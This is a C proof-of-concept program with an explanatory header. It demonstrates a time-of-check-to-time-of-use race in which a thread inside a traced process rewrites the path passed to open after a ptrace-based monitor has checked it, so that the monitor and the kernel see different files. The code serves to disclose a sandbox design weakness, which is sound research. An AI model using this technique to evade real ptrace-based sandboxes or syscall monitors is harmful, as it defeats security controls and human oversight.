/* 
 *
 * Copyright (c) 2012, Stephan Peijnik <stephan@peijnik.at>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above copyright
 *      notice, this list of conditions and the following disclaimer in the
 *      documentation and/or other materials provided with the distribution.
 *    * Neither the name of the <organization> nor the
 *      names of its contributors may be used to endorse or promote products
 *      derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL Stephan Peijnik BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * ABSTRACT
 *
 * This proof of concept shows that ptrace is not suitable for security 
 * applications of any kind.
 *
 * We are showing this by implementing a tracer which checks the path
 * value passed to the open syscall, a tracee which executes the syscall
 * and an additional thread inside the tracee which will modify the path 
 * value which was passed to open just in time between the tracer checking it 
 * and the kernel executing the syscall. 
 * As a result the tracer will believe that PATH_GOOD is being opened, whereas
 * the information processed by the kernel is PATH_BAD.
 *
 * Using such a method a tracee can easily work around possible limits imposed 
 * by a tracer with correct timing, not only limited to the open syscall.
 * This means that making assumptions about each and every syscall where
 * the kernel has to fetch information from userspace from within a
 * ptrace-based tracer is not wise from a security standpoint.
 *
 * We will show that a thread inside the tracee can, given the right timing,
 * successfully modify the information passed to the kernel and acted upon,
 * whereas the tracer sees different information.
 *
 * SETUP
 *
 * There are three parties involved in this setup. Namely,
 *  * the tracer, which would normally impose limits on its tracee,
 *  * the tracee, which issues syscalls the tracer will check and
 *  * a thread inside the tracee, substituting values after the tracer
 *    has checked them.
 *
 * Two files are created at PATH_GOOD and PATH_BAD and both are filled
 * with content (namely CONTENT_GOOD and CONTENT_BAD). The contents of the
 * files can later on be used to check which file the tracee actually opened.
 * 
 * TRACER
 *
 * The tracer's purpose is to monitor the syscalls made by the tracee using
 * ptrace. When a syscall is executed by the tracee the tracer gets notified
 * via waitpid and then checks the values as passed to the syscall.
 * In a real-world scenario the tracer would actually impose limits, but
 * for this proof of concept it is sufficient to print out the values
 * as seen by the tracer. Additionally, as this tracer only checks sys_open
 * the contents of the opened file are also printed out.
 *
 * TRACEE
 *
 * The tracee is subject to syscall monitoring by the tracer. Upon 
 * initialization it creates a thread which will modify the memory area
 * holding the information passed as path argument to sys_open just in time
 * so the tracer sees a different value than that the kernel acts upon.
 *
 * TIMING
 *
 * The whole process described below only works with correct timing. However,
 * it is not up to this code to show what the correct timing to modify
 * the value so the tracer and kernel work with different values is.
 * Therefore this proof of concept uses synchronization via a semaphore 
 * between the tracer and the tracee's thread to signal the tracee's thread
 * when to modify the value.
 * In a real-world scenario this would not be the case, but the whole purpose
 * of this code is to show that this is possible. The only thing needed for
 * use of this system in generic environments is finding the correct timing,
 * which depends on multiple factors, such as the kernel, tracer and so on.
 *
 * ATTACK
 *
 * The attack works by changing the value of the memory region pointed to by 
 * the path argument as passed to sys_open. This has to be done with the right
 * timing, which means just after the tracer has processed the information
 * and just before the kernel continues the execution of the syscall.
 *
 * This is carried out by a second thread inside the tracee which does not even
 * need to invoke a syscall, but only modify the memory shared with tracee's
 * main thread. As no syscall is involved this modification CAN NOT be detected
 * in any sensible way. 
 * It would be possible to check the value inside the tracer multiple times, 
 * but this just changes the correct timing required to carry out the 
 * modification. 
 * As the tracer most likely needs to retrieve the information and check it then
 * there should always be enough time (between retrieval and resuming the
 * tracee) for this attack to take place.
 *
 * We show that it is sufficient to call usleep with a value of 1 (meaning
 * a one-microsecond sleep) in the tracer to give the tracee's thread a 
 * chance to swap values.
 *
 * In actual tracer implementations this obviously will not be happening,
 * but chances are good the tracer needs to carry out another syscall
 * after checking the value, like locking or unlocking a mutex. 
 * Also, even without a syscall carried out by the tracer the checking alone
 * may take long enough for the swapping described above to happen.
 *
 * CONCLUSION
 *
 * In short: ptrace-based security just does not work. The attack vector shown
 * here presents a way to work around sandboxes based on ptrace, given the right
 * timing. When executing the code below it becomes clear that the tracee is 
 * able to open PATH_BAD and read the contents of the file, whilst the tracer 
 * believes the tracee opened PATH_GOOD.
 *
 * COMPILING
 *
 * gcc --std=gnu99 -Wall -Werror -pthread -o proof_of_concept proof_of_concept.c
 * 
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

/* 
 * The artificial delay in microseconds
 * imposed on the tracer after reading the value from the tracee's memory.
 * If the attack does not work you might want to increase this value a bit.
 */
#define EXEC_DELAY 1

/*
 * Path to the good and bad files
 * WARNING: cleanup_environment will unlink both
 *          files when the tracer exits.
 *          If you want to keep these files around define NO_CLEANUP
 *          when compiling.
 */
#define PATH_GOOD "/tmp/file_good"
#define PATH_BAD  "/tmp/file__bad"

/*
 * Contents of the good and bad files
 */
#define CONTENT_GOOD "good file contents"
#define CONTENT_BAD  "BAD FILE CONTENTS!"

/*
 * Architecture-dependent macros.
 * Right now this is limited to x86 and x86_64
 * only. These bits will need to be adapted 
 * for other architectures.
 */
#ifdef __i386__
#define SYSCALL_NO(regs) (regs.orig_eax)
#define SYSCALL_ARG0(regs) (regs.ebx)
#elif __x86_64__
#define SYSCALL_NO(regs) (regs.orig_rax)
#define SYSCALL_ARG0(regs) (regs.rdi)
#else
#error "This proof of concept only targets x86 and x86_64."
#endif /* __i386__ || __x86_64__ */

/*
 * Enable debug output by defining DEBUG
 */
/*#define DEBUG*/

#ifdef DEBUG
#define dprintf printf
#else
static inline int noop(const char *fmt, ...) 
{
  return 0;
}
#define dprintf noop
#endif

enum EXIT_CODE {
  EXIT_OK,
  EXIT_OPEN_FAILED,
  EXIT_MMAP_FAILED,
  EXIT_SEMINIT_FAILED,
  EXIT_THREADINIT_FAILED,
  EXIT_SEMWAIT_FAILED,
  EXIT_PTRACE_FAILED,
};

/*
 * Structure holding information
 * passed to the tracee's thread.
 */
struct tracee_info_s {
  sem_t *sem_thread_rdy;
  sem_t *sem_tracer_readdone;
  char  *path;
};

static char path_inject[128];

/*
 * init_environment initializes the contents of PATH_GOOD and
 * PATH_BAD and closes the files again...
 */
static enum EXIT_CODE init_environment(void)
{
  int fd = 0;
  fd = open(PATH_GOOD, O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR);
  if (fd < 0) {
    printf("open() on %s failed: (%d) %s.\n", PATH_GOOD,
	   errno, strerror(errno));
    return EXIT_OPEN_FAILED;
  }

  /* Just assume write and close worked.
   * No error checking here...
   */
  write(fd, CONTENT_GOOD, strlen(CONTENT_GOOD));
  close(fd);

  fd = open(PATH_BAD, O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR);
  if (fd < 0) {
    printf("open() on %s failed: (%d) %s.\n", PATH_BAD,
	   errno, strerror(errno));
    return EXIT_OPEN_FAILED;
  }
  write(fd, CONTENT_BAD, strlen(CONTENT_BAD));
  close(fd);
  return EXIT_OK;
}

/*
 * Clean-up environment.
 * This removes the files at PATH_GOOD and PATH_BAD.
 */
static void cleanup_environment(void)
{
#ifndef NO_CLEANUP
  unlink(PATH_GOOD);
  unlink(PATH_BAD);
#endif
}

/*
 * Initializes synchronization between tracer and tracee.
 */
static int init_sync(sem_t **sem_tracer_readdone)
{
  int res = 0;
  *sem_tracer_readdone = (sem_t*) 
    mmap(NULL, sizeof(sem_t), PROT_READ|PROT_WRITE,
	 MAP_SHARED|MAP_ANONYMOUS, 0, 0);

  if (*sem_tracer_readdone == NULL) {
    printf("mmap() failed: (%d) %s.\n", errno, strerror(errno));
    return EXIT_MMAP_FAILED;
  }
  
  res = sem_init(*sem_tracer_readdone, 1, 0);
  if (res != 0) {
    printf("sem_init() failed: (%d) %s.\n", errno, strerror(errno));
    return EXIT_SEMINIT_FAILED;
  }

  return EXIT_OK;
}

/*
 * start_routine for the tracee's thread
 */
static void *run_tracee_thread(void *arg) 
{
  struct tracee_info_s *tracee_info;
  tracee_info = (struct tracee_info_s*) arg;

  dprintf("[TRACEE_THREAD] Got info: %p, %p, %p\n", tracee_info->path,
	  tracee_info->sem_thread_rdy, tracee_info->sem_tracer_readdone);

  /* Signal the tracee that we are ready. */
  sem_post(tracee_info->sem_thread_rdy);
  printf("[TRACEE_THREAD] Waiting for tracer_readdone semaphore post.\n");

  /* Wait for the tracer to finish reading */
  sem_wait(tracee_info->sem_tracer_readdone);
  printf("[TRACEE_THREAD] Changing value of path...\n");
  strcpy(tracee_info->path, PATH_BAD);
  printf("[TRACEE_THREAD] Finished changing value of path...\n");
  return NULL;
}

static enum EXIT_CODE start_tracee(sem_t *sem_tracer_readdone)
{
  pthread_t tracee_thread;
  sem_t tracee_thread_rdy;
  int res = 0;
  int fd = 0;
  char *path = path_inject;
  char buffer[128];
  size_t bytes_read = 0;
  long ptrace_res = 0;

  struct tracee_info_s tinfo;
  tinfo.sem_tracer_readdone = sem_tracer_readdone;

  printf("[TRACEE] init.\n");
  res = sem_init(&tracee_thread_rdy, 0, 0);
  if (res != 0) {
    printf("[TRACEE] sem_init() failed: (%d) %s.\n", errno, strerror(errno));
    return EXIT_SEMINIT_FAILED;
  }

  strcpy(path, PATH_GOOD);
  tinfo.path = path;
  tinfo.sem_thread_rdy = &tracee_thread_rdy;
  
  res = pthread_create(&tracee_thread, NULL, run_tracee_thread,
		       &tinfo);
  if (res != 0) {
    printf("[TRACEE] pthread_create() failed: (%d) %s.\n", errno, 
	   strerror(errno));
    return EXIT_THREADINIT_FAILED;
  }

  /* Wait for the our thread to become ready. */
  res = sem_wait(&tracee_thread_rdy);
  if (res != 0) {
    printf("[TRACEE] sem_wait() failed: (%d) %s.\n", errno, strerror(errno));
    return EXIT_SEMWAIT_FAILED;
  }

  printf("[TRACEE] Thread ready.\n");

  ptrace_res = ptrace(PTRACE_TRACEME, 0, 0, 0);
  if (ptrace_res != 0) {
    printf("[TRACEE] ptrace(PTRACE_TRACEME) failed: (%d) %s.\n", errno,
	   strerror(errno));
    return EXIT_PTRACE_FAILED;
  }

  /* Give tracer a chance to start tracing */
  printf("[TRACEE] Sending SIGSTOP to self.\n");
  kill(getpid(), SIGSTOP);
  printf("[TRACEE] Now being traced.\n");

  /* Carry out the syscall */
  fd = open(path, O_RDONLY, 0);

  if (fd < 0) {
    printf("[TRACEE] open() on %s failed: (%d) %s.\n",
	   path, errno, strerror(errno));
    return EXIT_OPEN_FAILED;
  }

  /* Read contents from file. */
  bytes_read = read(fd, buffer, 63);
  buffer[bytes_read] = 0x0;
  printf("[TRACEE] Contents of file: \"%s\"\n", buffer);
  close(fd);

  printf("[TRACEE] exit.\n");
  return EXIT_OK;
}

static enum EXIT_CODE start_tracer(sem_t *sem_tracer_readdone) 
{
  pid_t tracee_pid = 0;
  int tracee_exited = 0;
  int tracee_status;
  int tracee_initialized = 0;
  long ptrace_result = 0;
  int signal = 0;
  int in_syscall = 0;
  int mem_fd = -1;
  size_t bytes_read = 0;
  char mem_fd_file[128];
  char filename_buf[128];
  void* path_addr = NULL;
  int target_fd = 0;
  char filecontent_buf[128];
  struct user_regs_struct tracee_regs;

  printf("[TRACER] init.\n");
  tracee_pid = fork();
  if (tracee_pid == 0) {
    /* Inside tracee. */
    exit(start_tracee(sem_tracer_readdone));
    /* Unreachable. */
  }
  
  /* Tracer's main loop */
  do {
    /* Wait for status change of tracee. */
    waitpid(tracee_pid, &tracee_status, WUNTRACED);

    /* Tracee exited. */
    if (WIFEXITED(tracee_status)) {
      printf("[TRACER] tracee exited with code %d.\n", 
	     WEXITSTATUS(tracee_status));
      tracee_exited = 1;
    }
    /* Tracee stopped */
    else if (WIFSTOPPED(tracee_status)) {
      dprintf("[TRACER] tracee has stopped with signal %d\n",
	      WSTOPSIG(tracee_status));

      /* ptrace has not been initialized correctly yet. */
      if (tracee_initialized == 0) {
	ptrace_result = ptrace(PTRACE_SETOPTIONS, tracee_pid, 
			       0, PTRACE_O_TRACESYSGOOD);

	if (ptrace_result != 0) {
	  printf("[TRACER] ptrace(PTRACE_SETOPTIONS) failed: (%d) %s.\n",
		 errno, strerror(errno));
	  kill(tracee_pid, SIGKILL);
	  return EXIT_PTRACE_FAILED;
	}
	printf("[TRACER] ptrace options set. Resuming child with PTRACE_SYSCALL.\n");
	ptrace_result = ptrace(PTRACE_SYSCALL, tracee_pid, 0, 0);
	if (ptrace_result != 0) {
	  printf("[TRACER] ptrace(PTRACE_SYSCALL) failed: (%d) %s.\n",
		 errno, strerror(errno));
	  kill(tracee_pid, SIGKILL);
	  return EXIT_PTRACE_FAILED;
	}

	/* initialization done. */
	tracee_initialized = 1;
      } 
      /* default case: already initialized. */
      else {
	signal = WSTOPSIG(tracee_status);

	/* signal was a SIGTRAP */
	if ((signal & ~0x80) == SIGTRAP) {

	  /* syscall bit set */
	  if ((signal & 0x80) > 0) {

	    /* Get registers of tracee */
	    ptrace_result = ptrace(PTRACE_GETREGS, tracee_pid, 0, &tracee_regs);
	    if (ptrace_result != 0) {
	      printf("[TRACER] ptrace(PTRACE_GETREGS) failed: (%d) %s.\n",
		     errno, strerror(errno));
	      kill(tracee_pid, SIGKILL);
	      return EXIT_PTRACE_FAILED;
	    }
	    
	    /* We are not currently inside a syscall */
	    if (in_syscall == 0) {
	      dprintf("[TRACER] Tracee invoked syscall #%ld.\n", 
		      SYSCALL_NO(tracee_regs));

	      /* sys_open was called */
	      if (SYSCALL_NO(tracee_regs) == __NR_open) {
		printf("[TRACER] Tracee called SYS_open.\n");

		/* Read from tracee's memory */
		snprintf(mem_fd_file, 128, "/proc/%d/mem", tracee_pid);
		mem_fd_file[127] = 0x0;
		
		mem_fd = open(mem_fd_file, O_RDONLY, 0);
		if (mem_fd < 0) {
		  printf("[TRACER] open() on %s failed: (%d) %s, fd=%d.\n",
			 mem_fd_file, errno, strerror(errno), mem_fd);
		  kill(tracee_pid, SIGSTOP);
		  return EXIT_OPEN_FAILED;
		}
		path_addr = (void*) SYSCALL_ARG0(tracee_regs);
		printf("[TRACER] Reading from tracee memory at address %p.\n", 
		       (void*)path_addr);
		if (pread(mem_fd, filename_buf, strlen(PATH_GOOD), 
			  (__off_t) path_addr) < 0) {
		  printf("[TRACER] pread() failed: (%d) %s.\n",
			 errno, strerror(errno));
		}
		filename_buf[strlen(PATH_GOOD)] = 0x0;
		printf("[TRACER] Would make decision based on path=%s\n", 
		       filename_buf);

		/* Open the file from within the tracer and print its   
		 * contents.
		 */
		target_fd = open(filename_buf, O_RDONLY, 0);
		if (target_fd < 0) {
		  printf("[TRACER] open() on %s failed: (%d) %s.\n",
			 filename_buf, errno, strerror(errno));
		  kill(tracee_pid, SIGKILL);
		  return EXIT_OPEN_FAILED;
		}
		bytes_read = read(target_fd, filecontent_buf, 127);
		filecontent_buf[bytes_read] = 0x0;
		printf("[TRACER] Contents of file: \"%s\"\n", filecontent_buf);

		/* Notify the tracee's thread that we are done reading.
		 * This is the point after which the tracee's thread can
		 * become active and change the value before the kernel
		 * evaluates it.
		 */
		sem_post(sem_tracer_readdone);
		
		/* Delaying the execution here gives the tracee's thread
		 * enough time to modify the path...
		 */
		printf("[TRACER] Delaying execution by %d useconds...\n",
		       EXEC_DELAY);
		usleep(EXEC_DELAY);
	      }
	      in_syscall = 1;
	    } else {
	      /* we do not care about the syscall's result... */
	      in_syscall = 0;
	    }
	  }
	}

	/* fall-through:
	 * resume tracee.
	 */
	ptrace_result = ptrace(PTRACE_SYSCALL, tracee_pid, 0, 0);
	if (ptrace_result != 0) {
	  printf("[TRACER] ptrace(PTRACE_SYSCALL) failed: (%d) %s.\n",
		 errno, strerror(errno));
	  kill(tracee_pid, SIGKILL);
	  return EXIT_PTRACE_FAILED;
	}
      }
    }
  } while (tracee_exited == 0);
  
  return EXIT_OK;
}

int main(int argc, char **argv)
{
  enum EXIT_CODE res;
  sem_t *sem_tracer_readdone;
  
  res = init_environment();
  if (res == EXIT_OK) {
    dprintf("[MAIN] environment initialized.\n");

    res = init_sync(&sem_tracer_readdone);
    if (res == EXIT_OK) {
      dprintf("[MAIN] synchronization initialized.\n");
      res = start_tracer(sem_tracer_readdone);
      if (res == EXIT_OK) {
	printf("[MAIN] Compare lines containing \"Contents of file:\".\n");
      }
    }
  }

  /* fall-through: cleanup */
  dprintf("[MAIN] environment cleaned up.\n");
  cleanup_environment();
  return res;
}
